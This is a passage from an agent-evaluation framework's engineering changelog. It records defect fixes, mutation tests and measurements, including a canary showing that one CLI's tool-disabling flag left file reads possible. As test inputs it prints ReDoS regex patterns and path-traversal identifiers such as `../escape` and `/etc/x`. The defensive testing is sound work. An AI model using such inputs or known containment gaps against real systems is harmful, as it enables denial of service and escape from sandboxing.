   (including S2's exact three caps and `(a+)+`, `(a*)*`, `(a+)*`), 11 that
   must pass (`^\S+$`, `(?:foo|bar){1,3}`, `\bword\b`, and the rewrite the
   error message itself recommends — a fix whose advice the detector then
   rejects is a dead end). All 21 agree. Planted in a scratch corpus file,
   `load_scenario` refuses it, names the file, and leads with `unusable
   check:`. A long input is **refused, never truncated** — "at most 35 words"
   of the first 10,000 characters is a different question.
4. **`loop score --json` gains `attribution`**, closing ADR 0156's further
   defect. `run_scenario` already computed both halves and `cmd_score` emitted
   neither, so "the provider died" and "the answer was wrong" were both
   `0.0000` and telling them apart took token arithmetic. Tested on both
   shapes with a stub provider; on the real corpus it immediately names the
   case-sensitivity that has explained `sum-14` and `sum-16`'s 0.75 in prose
   since ADR 0123.

**The metric is unchanged.** `aef loop score agents.summary.graph:build_graph
--corpus corpus --splits train,validation --json`, before and after,
`diff`ed: identical byte for byte. train `0.9792` (n=12, stdev 0.0722),
validation `0.9167` (n=6, stdev 0.1291), `sum-07`/`sum-14`/`sum-16` at 0.75,
18 cassette hits and 0 misses.

**Mutations: 5 of 5 caught**, every restore sha256-verified — the detector as
a no-op, `max_words` reversed, `_holds` skipping the refusal, `cmd_score`
dropping the `failure` string, and one corpus scenario keeping the old cap.
**M3 exposed a weak test of my own**: with the refusal removed, the
defence-in-depth test did not go red, it **hung** — which is the defect
itself, and a hanging test is not a failing test. Rebuilt around a
child-process wall so it fails in 5 seconds instead of never; the mutation was
not dropped to keep the test.

**Green bar.** `pytest -q` 2178 passed, 5 skipped (from 2131; +47). `mypy aef
examples` 131 files clean. `ruff check .` clean. `ruff format --check aef
tests examples` 252 formatted.

**No rubric score moves** — this is a defect fix, not a measurement. What it
buys is ADR 0156's consequence 4: "D2 blocks every live measurement in this
repo until it is fixed" no longer holds.

**Deliberately left.** `min_words` exists and nothing on disk uses it; whether
the twenty scenarios should move to `max_words` + `min_words` is a decision
for whoever next re-records the corpus, since it changes their recorded
scores. No generated document lists the check ops — `grep "contains"` across
`aef/cli/adopt.py`, `aef/cli/adopt_loop.py` and `aef/cli/templates/` finds
nothing — so nothing under `adopt` needed an edit, recorded so M2 does not go
looking. ADR 0156's third defect (`next(iter(modelUsage))`) is ADR 0154's and
is not touched here.

---

## S1 / I12 — the ACE four-arm on the task metric (ADR 0155)

**Model: `claude-opus-5[1m]`** — the session default, `--model` omitted from
the argv; Fable's quota is exhausted and the owner authorised Opus, so all
four arms were re-measured and no earlier Fable number is reused.

**Expected, stated before running** (`TO_90_LOOP.md` §I12): four arms over
the summary validation split, dim 2 moves 17 → 19 only if (c) > (b) by more
than the spread. Falsifications fixed in advance: (c) ≤ (b) demotes ADR
0110's coverage result to a proxy; (d) ≤ (c) keeps LLM reflection off; a gain
smaller than the spread is not a gain.

**Reproduced first, zero calls.** The four arms were the same experiment four
times: `draft_node` built its prompt from `working_memory` and never read
`state.retrieved_context`, so arms (a), (b), (c) and (d) produced **one
identical SHA-256 over every rendered prompt** while chunks retrieved climbed
0→5. ADR 0118's "the retriever finally has a caller" was true and
insufficient — a caller that writes state nobody reads. Erratum appended to
0118.

**Changed.** `render_retrieved_context(state, *, max_items=5)` in
`aef/reasoning/nodes.py` — generic, state-only, no clock, no randomness, safe
in a `deterministic=True` node; `draft_node` appends it. With nothing
retrieved the prompt is **byte-identical** to before, pinned by a literal
golden, so every committed cassette still hits and `aef loop score` still
makes no live call.

**Mutations, both detected.** `lessons = ""` in `draft_node` → the regression
test fails. `render_retrieved_context` returning the header instead of `""`
→ the golden and three renderer tests fail. Reverted, shasum-verified.

**Measured**, 84 live calls, `--repeats 2`, one arm-repeat per foreground
invocation, results written as they landed (`docs/research/i12/`):

| arm | mean | r0 | r1 | spread | calls | knowledge entries |
|---|---|---|---|---|---|---|
| (a) no retrieve | 0.8541 | 0.8333 | 0.8750 | 0.0417 | 12 | 0 |
| (b) raw records | 0.8541 | 0.8333 | 0.8750 | 0.0417 | 12 | 0 |
| (c) + knowledge | 0.8334 | 0.7917 | 0.8750 | 0.0833 | 12 | 0 |
| (d) + LLM reflection | 0.9166 | 0.8750 | 0.9583 | 0.0833 | 48 | 0 |

Largest within-arm spread **0.0833**. (b) − (a) = +0.0000. (c) − (b) =
−0.0207. (d) − (c) = +0.0832, under the spread.

**Verdict: dim 2 does not move. 17/20 stands, delta 0.** The (c) ≤ (b)
falsification fired. The sharper finding is that **no knowledge entry formed
in any arm**: six distinct objectives, no `state.errors`, so every record is
a `success` with a unique signature and the consolidator's two-distinct-runs
rule is never met — (c) and (b) are the same arm. ADR 0110's coverage result
is demoted to a proxy that has *not been shown* to predict task outcome; it
is not disproved, because this corpus cannot test it. `reflection.impl: llm`
stays off, third measurement running.

**Two defects found, reported, NOT fixed** (neither file is this worker's):

1. The corpus word-cap check `^(?:\s*\S+){1,35}\s*$` **does not terminate in
   600 s on a 36-word summary** (35 words: 0.0000 s). The check that catches
   over-length summaries hangs on over-length summaries. Invisible under
   cassettes, where every recorded summary is within the cap; it fires only
   live. This is the likely true cause of ADR 0123's "three attempts past a
   ten-minute wall", which was read as a throttle. Blocks any live scoring on
   this corpus — S2's noise floor above all. `corpus/**/sum-*.json` +
   `aef/harness/checks.py`.
2. `ClaudeCodeProvider` reads the answering model as the first `modelUsage`
   key, which is the CLI's own auxiliary haiku call, so `Provenance.model` in
   every recorded run names the wrong model. `aef/providers/harness_provider.py`.

**Green bar:** 2016 passed / 3 skipped (plus 17 new), `mypy aef examples`
clean, `ruff check` and `ruff format --check` clean.


## Fix wave G2 — the containment claim was about one provider (ADR 0169)

`aef migrate` stamped this into every generated prompt-agent module, as fact:

    THE PROMPT RUNS; THE AGENT'S TOOLS DO NOT. ... the harness adapters send
    `--tools ""` with `--max-turns 1`.

and `make_prompt_agent_node` said **"nothing in this path can open a file,
spawn a process or reach a network service."** Both sentences describe
`ClaudeCodeProvider`. The path takes whatever `model_provider.impl` names, and
printing the argv for the same `CompletionRequest` shows three mismatches:

```
codex:                 [..., '--sandbox','read-only', ..., '<persona>\n\nsay ok']
command WITH {system}: ['cli','-m','m1','--system-prompt-override','<persona>','-p','say ok']
command NO   {system}: ['cli','-m','m1','-p','<persona>\n\nsay ok']
```

`codex exec` sends **neither** flag — an agentic loop in a read-only sandbox,
with no system-prompt flag, so the persona goes in the USER turn. `impl:
command` — ADR 0154's answer for Copilot's CLI and every harness after it —
sends whatever the owner's argv template says and nothing more. No test joined
the claim to the provider set, and one asserting "every impl is
tool-suppressed" would fail on `command` by construction.

**The suspected item, measured. Three live `grok` calls, budget three.** A
directory holding one file whose first line is
`AEF_CANARY_7F3A_THIS_LINE_PROVES_A_FILE_WAS_READ`, `--cwd` pointed at it, the
adapter's exact tool flags, the prompt "List the files in the current
directory and print the first line of each":

| arm | exit | `stopReason` | `num_turns` | reply |
|---|---|---|---|---|
| `--max-turns 1` (what ships) | 1 | `cancelled` | 1 | a **tool preamble**; stderr `Error: max turns reached` |
| `--max-turns 3` | 0 | `end_turn` | 2 | **contains the canary** |

**`grok --tools ""` suppresses nothing on 1.0.5.** `claude --help` documents
the identical spelling as *"Use \"\" to disable all tools"*. Same flag
spelling, opposite semantics — ADR 0150's rule one level up. What contains the
shipped Grok adapter is `--max-turns 1`, and it contains by *cancelling the
run*; whether the read executed before the cancellation is **not established**,
and that is written down rather than closed. `--disallowed-tools` is the right
lever and is left unused, because `grok --help` lists no built-in tool names
and this repo does not ship guessed flag values.

**The fix is to condition the claim and make it per-run evidence.**
`ModelProvider.isolation` is a closed vocabulary, DERIVED for the three
harness adapters from the argv each builds for a sentinelled probe request, so
a removed flag retracts its claim in the same commit:

    claude_code  no_tools, no_mcp, single_turn, no_project_context, system_role
    codex        read_only_fs, user_turn_persona
    grok         single_turn, no_web_search, no_subagents, system_role
    anthropic    structural — no tools parameter, no local process, system=
    command      the owner's UNVERIFIED `isolation:` + the derived channel
    cassette     the inner provider's, or nothing
    fallback     the INTERSECTION — as isolated as its least-isolated member

`command`'s template flags are deliberately never read as evidence: `--tools
""` means opposite things on the two CLIs measured above, so inferring
semantics from an unknown binary's spelling is a guess dressed as evidence.

The node now writes provider, isolation and the persona's channel to
`working_memory["<node id>__containment"]` on every run, and appends a
`prompt_agent.persona_in_user_turn` error when the persona went out in the
user turn — a warning rather than a refusal (some CLIs have no system flag),
but an *error entry*, so the run scores 0 and reaches failure memory. Said out
loud rather than discovered. Three-valued: a provider that declares nothing
records `unknown` and does not warn, which is what keeps the replayed corpus
unaffected. The generated header, the migrate report and the docstrings state
the per-impl truth, and a test asserts the old sentence is **absent**.

**Two defects folded in from S3's 36 live judge calls.** `answering_model`'s
rule 3 misattributed one of them to the CLI's helper model, because a
JSON-only judge reply is ~12 output tokens — fewer than the helper writes — so
"the answering model writes the answer" inverts on the shortest replies. The
requested-name rule would have won and never ran: `agent_services(reflection=
"llm")` sets `model = reflection_model or ""`, so `requested` is empty and
rule 3 decides alone. The function now returns an attribution
(`requested`/`alias`/`sole`/`heuristic`/`unknown`) carried on
`CompletionResult`; the `runtime.py` root cause is reported upward, not
touched. And **`input_tokens` was never the cost** — it is the uncached
remainder, *2* on all 36 calls, so ADR 0126's 211,470-vs-4,684 figures rested
on numbers this code did not retain. The cache counters are now fields,
`total_input_tokens` is the sum, and both live isolation guards read it: the
Claude guard had the identical defect ADR 0154 found in Grok's and fixed only
there.

Eleven mutations, eleven detected, each reverted from a `shasum`-verified byte
backup, plus a deliberate no-op control correctly **not** detected. **M7
reported NOT DETECTED on its first run and the harness was at fault:**
`"heuristic"` → `"requested"` is the SAME LENGTH, and the write landed in the
same clock second as the previous restore of the same file, so CPython's
`(mtime, size)` check served the pre-mutation `.pyc`. Purging `__pycache__`
and running `python -B` detects it immediately. Worth keeping: a same-length
edit is exactly what a mutation harness is made of, and a stale bytecode cache
reports every one of them as a hole in the suite.

**Still open, stated rather than implied.** `claude --tools ""` has **not**
been canary-tested — the live budget was grok-only, and the one CLI that was
tested is the one whose documented reading turned out to be wrong; `no_tools`
on `claude_code` rests on its own `--help`. Grok's `--disallowed-tools` needs
a tool-name list this box cannot obtain. The empty `reflection_model` in
`aef/services/runtime.py` still sends every judge call down the heuristic
attribution path.

Green bar: `pytest -q` 2178 passed, 5 skipped (2158 → 2183 collected, +25) ·
`mypy aef examples` clean on 131 files · `ruff check .` clean ·
`ruff format --check aef tests examples` clean · `tests/test_vendor_isolation.py`
green · **3 live model calls, all `grok`.**


## Fix wave G1b — the diagnostic that never opened the agents (ADR 0168)

Six findings — four from the first seam hunt, one from the second, and M4 folded
in — each reproduced by running a command before anything was changed. **Zero
live model calls.** No rubric dimension moves.

**F3 (HIGH).** On a copy of the marlin pilot clone, `aef migrate` wrote eight
prompt-agent graphs; `find -name graph.py` counted **nine** on disk; `aef
doctor` listed **two**, and obligation 6 — ADR 0137's *every model call reaches
the harness* — **passed on `agents/migrated/graph.py`**, the call-site stub
whose `build_graph()` raises `NotImplementedError` and which makes no model call
at all. The eight that do were never opened.

The cause is a seam, not a bug in either half: doctor globbed `<agent
root>/*/graph.py` (one level) and ADR 0152's migrate writes `<agent
root>/migrated/<module>/graph.py` (two). Both halves tested; no test ran the
producer into the consumer.

**Erratum on ADR 0149**, recorded in that ADR as well as this one: its docstring
claimed that deriving every path from `DEFAULT_AGENT_ROOT` meant the list
"cannot leave this list naming a directory nothing writes to". That held for one
writer. Derivation kept the ROOT correct and said nothing about the DEPTH. A
shared constant proves two names spell one string; it cannot prove a glob
matches what another command writes.

Discovery is now ONE function — `aef.harness.zones.discover_graph_files`, in
`zones` because `aef/harness/preflight.py` needs it and the harness does not
import the CLI — and the invariant is enforced by running the real `run_migrate`
into the real `_graph_entries`. `aef doctor --agent-root` added: a repo that
took ADR 0152's Zone A opt-in had doctor reporting on the two files *outside*
the widened root and nothing about the sixteen inside it.

**Reported for G1a, not edited:** preflight's obligation 6 is
`model_calls_are_visible(repo_root, agent_path)` — one path, defaulted by
`aef/cli/loop.py::cmd_doctor` — so `aef loop doctor` has the identical false
pass. `discover_graph_files` is importable today.

**F5 (MEDIUM).** One `aef migrate --agent-root .claude/agents` printed `Zone A
(agents/**)` for `agents/migrated/graph.py` twelve lines above `Zone A is
'.claude/agents'`, while `inspect_path` under that policy says Zone **C**.
`_zone_note` classified with the default `ZonePolicy` and hardcoded
`DEFAULT_AGENT_ROOT`; `result.agent_root` existed and never reached it. Now the
note reports the zone under the policy the loop will run, says in words that
`--agent-root` moves the prompt-agent graphs while `--out` moves the call-site
one, and prints the `--agent-path` values that ARE inside the root. The test
asserts against `inspect_path` itself, not a phrase.

**S2 (SUSPECTED → CONFIRMED).** A persona named `../escape` produced
`graph_id='../escape'`, printed as the value to hand `aef loop bless
--graph-id`. `archive._graph_dir` was `root / graph_id`, so `record()` wrote
`state/escape/v000001/` — one level above the archive root, which stayed empty;
`root / "/etc/x"` discards `root` entirely. Refused at both ends:
`zones.segment_refusal` in the one place every archive read and write goes
through (refused, never normalised — two spellings of one id must not disagree
about which directory they mean), and `aef migrate` renames to the already-
disambiguated module with the reason in the report. `AGENT_NAME` in the
generated module is untouched: only the id that becomes a DIRECTORY has to be a
path segment.

**F8 (LOW).** The bytecode advisory named `agents/`. On the widened clone,
compiling one generated module and `git add -A` tracked
`.claude/agents/migrated/marlin_accela/__pycache__/graph.cpython-313.pyc`. Adopt
runs before migrate and cannot know the root, so the message now states the rule
rather than guessing a path.

**Also found, reported, not fixed:** the report's `aef run
.claude.agents.migrated.marlin_accela.graph` is not an importable module name
under a widened root; a hand-typed hostile `--graph-id` now reaches the CLI as
an uncaught `ArchiveError` (`aef/cli/loop.py` is G1a's).

**M4 (HIGH, folded in).** The report's own printed command could not be run
under the flag M1 added:

    $ aef run .claude.agents.migrated.marlin_accela.graph --objective "x" --config aef.yaml
    error: the 'package' argument is required to perform a relative import for
    '.claude.agents.migrated.marlin_accela.graph'

A leading dot is a RELATIVE import to `importlib`, and no dotted spelling of
`.claude/agents/...` exists at all. **Erratum on ADR 0152**, recorded there: M1
ran `aef run` on a graph at the DEFAULT root and ran `--agent-root` without ever
running the command that flag makes migrate print. Each half exercised, the join
not — the same shape as F3, in M1's own evidence. M4 hit it and worked around it
by keeping the graphs at the default root while passing `--agent-root` to the
loop, which is the two-trees-one-loop state the blast-radius block warns about.

Refusing a non-importable root was rejected outright: `.claude/agents` IS the
documented opt-in, so a refusal deletes ADR 0152 §4 rather than fixing it. So
`aef run` — and `aef loop record`, which shares the loader — take a file path as
well, through ONE importer replacing the two copies of
`importlib.import_module`. The choice is made on the spelling, never by trying
the import and falling back: a module that fails for its own reason would
otherwise be retried as a filename and reported as "no such file", hiding the
real error behind a second one. `sys.modules` is keyed on the resolved path,
because migrate names every generated file `graph.py`.

Pinned producer → parser → runner: the test takes the `aef run ...` line out of
the real `report()`, `shlex.split`s it, feeds it to the real `build_parser()`,
and runs what argparse hands back through the real `run_graph_module` — against
a `command`-provider config whose argv is `["/bin/echo", "{prompt}"]`. A real
provider, a real subprocess, **no live model call**.

**R7 (MEDIUM, second seam hunt).** A repo whose `AGENTS.md` and `CLAUDE.md` are
both symlinks into `docs/` — one file of house rules read under two names:

    $ aef adopt --dir .
    skipped .../CLAUDE.md (a symlink, or under one — adoption never writes through a link)
    skipped .../AGENTS.md (a symlink, or under one — adoption never writes through a link)
    $ aef doctor --dir .
    [WARN] entry_file_points_at_the_guide:CLAUDE.md: ... fix: re-run `aef adopt --dir .`
    [WARN] entry_file_points_at_the_guide:AGENTS.md: ... fix: re-run `aef adopt --dir .`

`is_file()` follows the link, so the check reads the target's bytes, finds no
block, and prescribes the one command guaranteed not to add one. The only advice
on offer was a loop.

The FIX was wrong, not the check — and that distinction is load-bearing. Reading
through the link is right: a link whose target carries the block does reach the
agent, and narrowing the check to real files turns a correctly-adopted repo into
two warnings (the mutation that does exactly that fails
`test_a_symlink_whose_target_carries_the_block_is_ok`). The remedy now names the
target and says to add the block there or replace the link, and the walk covers
a symlinked PARENT directory too, because adopt refuses those as well.
`test_adopt_really_does_refuse_a_symlinked_entry_file` asserts adopt's half
against the real `run_adopt` rather than quoting its source, so the two sides of
the loop cannot drift apart silently.

**Also found, reported, not fixed:** a hand-typed hostile `--graph-id` now
reaches the CLI as an uncaught `ArchiveError` (`aef/cli/loop.py` is G1a's);
`aef loop bootstrap --module`'s help still says "module" and nothing tests the
loop commands under a widened root.

Twelve mutations, twelve kills, every restore verified against a `sha256` taken
before the edit — never `git checkout --`. Eleven were killed by tests written
before the mutation ran; **one survived the first pass** and is recorded: keying
`sys.modules` on the file's basename still loads the right file and still
returns a distinct module object, so `first is not second` passed while the
registry entry pointed at whichever was loaded last. The control was rebuilt to
assert `sys.modules` itself. That is what the mutation pass is for.

Green bar: `pytest -q` 2195 passed, 5 skipped (2153 -> 2195, **+42**, none
removed) · `mypy aef examples` 131 files clean · `ruff check .` clean ·
`ruff format --check aef tests examples` 252 files clean · **0 model calls.**

## Fix wave H2 — the containment field that was read by nothing (ADR 0173)

R5 of the second seam hunt, MEDIUM. ADR 0161 shipped
`shadow.containment: auto|fallback|off` with a validator, a drift test against
the enum, a test that the default is the contained one — and no wire.
`build_containment_mode` had zero callers; `shadow_for`'s `mode` defaulted to
`ContainmentMode.AUTO` in the signature. The config surface read as wired.

**Reproduced by running, both directions.** An owner who wrote
`containment: "off"` on a box with docker and `aef-worker:test` got
`decision.mode = auto`, `contained = True`, `owner_opted_out = False` — a
container they had declined. An owner who wrote `fallback` on a runtime-less
box got `UncontainedShadowError` instead of the fallback that mode exists to
give them. The harmless direction and the one that costs work.

**Fixed:** both `mode` parameters (`shadow_for`, `resolve_containment`) lose
their defaults — ADR 0101's rule applied to a parameter, since a default that
silently overrides the owner's config is a promise the signature makes and the
code breaks. `RunConfig` gains `containment_mode = build_containment_mode(
config.shadow)`, one derivation, its unconfigured value derived from
`ShadowConfig()` rather than restated as `AUTO`. After: `off → off,
contained=False, owner_opted_out=True` with the ledger entry carrying
`security_event`; `fallback → it RAN`; omitting `mode` → `TypeError`.

**Not done, on purpose:** shadow execution still has no production caller.
Adding one is a design decision, not a patch; the ADR states what it would
need (a worker image containing the adopter's own `aef`, a decision on which
live requests may be duplicated onto a candidate, an owner who has read trust
case §2.1) and `RunConfig`'s docstring states that the field's only reader
today is `RunConfig`.

**Rubric: no dimension moves.** S5's +1 on dim 4 survives, argued in the ADR:
the gap applied the CONTAINED-or-refuse mode unconditionally, so nothing
weaker than `auto` was reachable through it and no run was ever less contained
than 0161 claimed. The real cost was to the audit trail — `owner_opted_out:
True` had no path an owner could take to it. Erratum filed on ADR 0161 for the
two sentences that were false when written.

5 mutations, 5 caught, every restore sha256-verified. M1's first form failed
with an `IsolationError` from a real container rather than on the property
being pinned, and the TEST was rebuilt around `inspect.signature` rather than
the mutation dropped.

**Green bar:** 2269 passed / 5 skipped (2264 → 2269, +5), `mypy aef examples`
clean (132 files), `ruff check .` and `ruff format --check aef tests examples`
clean. Zero live model calls.


## Fix wave G1a — the unfixed twin, and the tree the baseline was of (ADR 0167)

Ten findings from two seam hunts over M1 (0152), M3 (0154) and J0F (0165),
plus three handed over by G1b. **Every one was reproduced by running a command
on the parent commit before anything was edited**, and the real output is in
the ADR with its exit code.

**The one worth the wave.** ADR 0165 found this repo's nightly `aef loop
cycle` exiting 0 having done nothing, argued at length that "a loop that has
run 180 nights producing nothing leaves a ledger byte-identical to one nobody
has started", and fixed it. It fixed one of the two commands that run a turn.
`aef loop run` read the same flag through the same
`FileMemoryStore(...) if args.memory else None` expression ninety lines below,
had **no guard at all**, and journalled **nothing**:

```
$ aef loop run --repo <r> --state <s> --workdir <w> --turns 2 --budget-minutes 1
    turn 1: no memory store configured: nothing to learn from, no candidate
    stopped: turn 1 produced no candidate
EXIT=0                       # five times

--- contents of the state dir ---
   (state dir does not exist)

$ aef loop monitor --repo <r> --state <s>
    cycles run: 0 (last never)
    last PROPOSED: never
```

Exactly the ambiguity 0165 §2 says it removed, one subcommand over. So the
regression test does not name the two commands: it **derives** them from
`aef/cli/loop.py`'s AST — every `cmd_*` importing `cycle` or `run_loop`,
mapped to its subcommand through its own `set_defaults` — and asserts the
derived set equals the set it can invoke. A planted third turn-runner (M7) is
caught by that assertion, so the class is closed rather than this instance.
`run` journals **one attempt per TURN**: the alarm counts consecutive quiet
attempts against a threshold of three, and ten quiet turns as one entry would
need thirty turns to fire.

And 0165's journal stopped at the happy path. `record_cycle_attempt` sat after
`cmd_cycle`'s `try`, so with the kill switch engaged the command printed
`HALTED:`, exited 2, and `cycles.jsonl` **did not exist**. It is in a
`finally` now, each branch naming its exception.

**The permanent red.** Preflight obligation 2 was unmeetable on every graph
`aef migrate` writes for a prompt agent — `loop doctor` printed
`a reflect node exists but nothing routes to it` and exit 1 while executing
that same module gave the trace `['prompt_agent', 'reflect', 'consolidate']`.
The detector wanted a three-argument node function; M1's generated module has
none, only `make_prompt_agent_node(route="reflect")`. Both shapes count now,
and `test_the_real_migrate_output_passes_the_real_preflight` runs the real
migrate into the real preflight — the C↔D join where the defect lived.

**The baseline that was of another tree.** `bless --agent-root .claude/agents`
wrote an `entry.json` with no `agent_root` anywhere, and the next cycle at the
default root was rejected with `cumulative drift: 1.000` — G5 unioning two
disjoint key sets, two rejections from a halt. `ArchiveEntry.agent_root` is
additive and `""` is deliberately NOT a mismatch, so no pre-existing baseline
is retroactively failed. And `--agent-root` non-default with `--agent-path`
left at `DEFAULT_AGENT_PATH` — Zone C under the widened root — is refused by
`bless`/`cycle`/`run`/`doctor`, naming both paths and the per-agent path
migrate actually wrote.

**Two exit codes that meant the same thing.** `main.py`'s catch-all returns 1
for any exception and `EXIT_REJECTED` is also 1, so the rendered nightly
workflow's `status >= 2` rule stayed green on a bad config, an import error,
or the `agents.migrated.graph` placeholder whose `build_graph()` raises
`NotImplementedError` — and the exception escaped before the journal, so
neither alarm could see those nights. `EXIT_ERROR = 3`, journalled with the
exception's name, `main.py` untouched, and the workflow's rule READ from
`adopt_loop.py` rather than assumed.

**Two more, from the enumerating shape.** Four of the nine subcommands taking
`--repo` and `--state` accepted a state directory inside the repo that `cycle`
refuses — `bless` printed `blessed ... as baseline v1` and left `archive/` and
`ledger.jsonl` in the working tree. And the digest reported S5's containment
fallback (no Docker, or `containment: off`) to the owner every Monday as
`**A proposal reached for the harness**`.

**The state-dir test caught a defect this wave introduced.** Its second
assertion is that nothing is *created* — and the first version of the journal
fix wrote `cycles.jsonl` into the very directory it had just refused. Putting
the check in `_config`, which runs before the try block, is what makes the
ordering right.

**Handed over by G1b and folded in.** Obligation 6 checked ONE path and passed
on the call-site stub that makes no model call while eight generated graphs
went unopened — the same false pass 0168 fixed in `aef doctor`, closed here
with 0168's own `discover_graph_files` rather than a second answer.
`ArchiveError` from a hand-typed `--graph-id ../x` came back as exit 1, i.e.
as a rejection (reproduced as exit 1, **not** as the traceback the report
predicted — `main()`'s catch-all swallows it, which is the whole problem). And
the loop's five `--module` help strings still said "importable module" after
0168 made the file-path form work, which is the form a widened `--agent-root`
needs; the help and the behaviour are now asserted together.

Sixteen mutations, sixteen caught, every restore verified byte-identical by
SHA-256, plus the real generated module regenerated and edited to `route=END`.

**Still open, stated rather than implied.** Nothing retroactively repairs a
baseline already blessed without a root, and whether any exists in the wild is
not measured. One of `cmd_cycle`'s three named exception paths is reproduced
end to end at the CLI; the other two are reachable through the CLI only behind
a blessed baseline inside its drift budget and a corpus recorded from the
matching graph, so they are exercised by injecting at the `aef.harness.loop.
cycle` collaborator boundary — never by mocking `cmd_cycle`. Nothing here
makes any scheduled loop more likely to propose anything; what changes is that
a loop producing nothing now says so from both of the commands that could.

Green bar: `pytest -q` 2396 passed, 6 skipped · `mypy aef examples` clean ·
`ruff check .` clean · `ruff format --check` clean · **0 model calls.**

---

## S3b — a corpus that can tell two judges apart (ADR 0171)

**Branch:** `upgrade/s3b-content-negatives`, off `2a201f1` (D2's ReDoS fix).
**Rubric claim:** dimension 3, +1. Total before: 69.
**Model:** `claude-opus-5[1m]`, the harness session's default, for both the
recordings and the judge — the recording config passes `model: ""` so no
`--model` reaches the CLI, and `run_i14.py` is invoked without one.

**Reproduce (RUN, before any change).** `aef loop score
agents.summary.graph:build_graph --corpus corpus --splits train,validation
--json`: train 0.9792, validation 0.9167, and `attribution` naming exactly
three failures — `sum-07 contains 'volunteers'` against "Volunteers restored
Ashcombe…", `sum-14 contains 'swimming'` against "Swimming will be
permitted…", `sum-16 contains 'landslip'` against "Landslip after heavy
rain…". All three summaries mention the term. These were the corpus's only
negatives, and ADR 0159 had already measured what that means: the split is
15/18 pass, so a judge answering "pass" to everything scores 15/18, the LLM
judge scored exactly 15/18, and the AUC was 0.322.

**Expectation, pre-registered before any judge call** (`prereg-v2.txt`):
dimension 3 moves 6 → 7 only if (1) the corpus ends with ≥ 6 scenarios whose
recorded answer fails an owner check, ≥ 2 in validation, (2) the LLM judge's
AUC on the enriched validation split is ≥ 0.70, and (3) the position delta
stays ≤ 0.20. Stated in advance because it changes how a 0.5 should be read:
`LLMJudge` is asked for a "quality" score and nothing tells it to count words,
so an AUC near 0.5 would have been evidence that the judge does not measure
what the owner's checks measure — a more useful finding than ADR 0159's, and
still +0.

**Measurement.**

*Hygiene.* The three case defects became `regex` with an inline `(?i)` — the
transformation `run_i14.py`'s own `_case_insensitive` oracle already applied,
made permanent, because `checks.py` has no case-insensitive op and `aef/` was
not this worker's. train 0.9792 → 1.0000, validation 0.9167 → 1.0000,
`attribution` empty: **20/20 pass and no negatives at all**, exactly as ADR
0159 predicted. The 20 word caps then moved to `max_words` + `min_words: 1`;
both of ADR 0166's objections are discharged rather than dodged (`min_words:
1` restores the predicate exactly; the 0.75 → 0.80 move it was protecting no
longer exists), and `loop score --json` before and after is identical byte for
byte. The scale did move — a score is `k/5` now, not `k/4` — and that is fine:
checks are the owner's data, the cassettes are untouched, and
`test_rubric_arithmetic` reads the rubric rather than the corpus.

*The unplanned find.* The new test asserting "no case-sensitive `contains` on
a summary" went red on **57 more checks in 20 files** — `Kestrel`, `otters`,
`copper`, `planning`, `1874` — every one passing today only because the model
happened not to open a sentence with it. All 57 corrected; score identical
before and after.

*Negatives.* 19 scenarios recorded live — `sum-21`…`sum-28` via `aef loop
bootstrap` (train only, by rule), `sum-29`…`sum-39` via `aef loop record
--split validation`, **checks written before every run**. **7 fail an owner
check**, 3 in train and 4 in validation. All 7 fail `max_words`, by one to
three words. Every content trap — negation, superseded figure, similar names,
a dropped unit, conditionality, direction-of-change — was handled correctly,
and the three apparent content failures were my checks written too narrowly
(`not overloaded` vs "no overloading"; `divers` vs "diverted"; `3.1 million`
vs "£3.1m"), each widened before anything was called a negative. On this task,
at this cap range, this agent's one reproducible failure is length.

*The A/B, re-run on the enriched validation split, 34 calls, same script.*
Rule-based 4/17 and constant-fail. **LLM 16/17, against a 13/17 constant
baseline, AUC 1.000** — every owner-fail state 0.275–0.635, every owner-pass
state 0.850–0.910, margin 0.215, and the failures ordered by the size of the
overrun (1 word → 0.635, 2 → 0.375/0.325, 3 → 0.275). Agreement by threshold
13/16/16/16/17 across 0.25–0.75, so the headline does not rest on one cut.
Position delta max **0.17**, and the maximum is the one-word overrun, the
single state the judge gets wrong at 0.5 — least stable where least certain.
The second oracle now rewrites nothing and reports identical numbers, because
the defect it existed to route around is gone from the data.

**Verdict: +1, dimension 3 6 → 7, total 69 → 70.** All three pre-registered
conditions fired. Not +2: J0's third gap for this row — a self-preference
control — is untouched and is S6's, and AUC 1.000 is perfect separation of
**one failure family with n = 4**, so what is shown is that this judge detects
word-cap overruns, not that it detects failure. The row's "Remaining" says so.

**Reported, not fixed.** `answering_model`'s rule 3 misattributed one call of
34 to `claude-haiku-4-5-20251001` — ADR 0159's defect 1, reproducing at the
same rate. `aef loop bootstrap` printed "0 of 8 recorded run(s) failed" on a
batch that produced three content negatives, because its failure notion is the
outcome class and none of the runs raised; the message it then prints is the
one about a corpus where everything passes demonstrating nothing, which is
misleading at exactly the moment an adopter is judging their inputs.
`tests/harness/test_cassette_replay.py` had the corpus's size pinned as
`n == 12 and n == 6` inside a test about live calls; fixed here, since it is a
test file and it blocked the bar.

**Green bar.** `pytest -q` 2251 passed / 5 skipped (from 2178); `mypy aef
examples` clean on 132 files; `ruff check .` clean; `ruff format --check` 257
files formatted. 5 mutations against the new test, 5 caught, every restore
proved by sha256. 54 live calls of 70.


## M4c — the gates could not judge a prompt (ADR 0170)

ADR 0157 shipped a proposer that writes a prompt candidate and stated its own
limit: **the gates could reject one and never accept one.** Three defects, all
reproduced offline by running before anything was changed, **zero live model
calls**.

**D1 — two gates, one scratch directory.** `g1_builds.py:49` and
`g2_outcome.py:111` both named `ctx.workdir / "workspace"`;
`trust._prepare_empty_destination` refuses a non-empty destination. Every
candidate that reached G2 without a precomputed cohort — which was every prompt
candidate, since the cohort could not be built for one — was rejected by a gate
that never judged it:

```
G1 pass  1 build command(s) succeeded against the merged workspace
G2 fail  gate raised TrustBoundaryError: scratch destination …/work/workspace
         must be empty. A gate that could not judge has not cleared this candidate.
```

Not prose-specific: two gates and a directory name. ADR 0148 met this message
and reasonably read it as a red herring. Fixed with a directory per gate —
**not** by having G2 reuse G1's tree, because G1 has just run build commands in
its copy and the emptiness rule is what guarantees a gate runs against base-ref
+ Zone A overlay and nothing else. The regression test asserts the property,
not the name: a build command that writes `artefact.txt` leaves it in
`workspace-G1` and not in `workspace-G2`.

**D2 — no null hypothesis for prose.** `ControlCohortGenerator` mutates
module-level numeric constants; a `.md` has none, so `CohortBuilder` raised and
G3 refused. This is **ADR 0139's requirement 2 arriving from a third
direction** — 0139 measured it on the proposer, ADR 0148 re-measured it as the
cohort's, and here it is the cohort's again and finally answered.
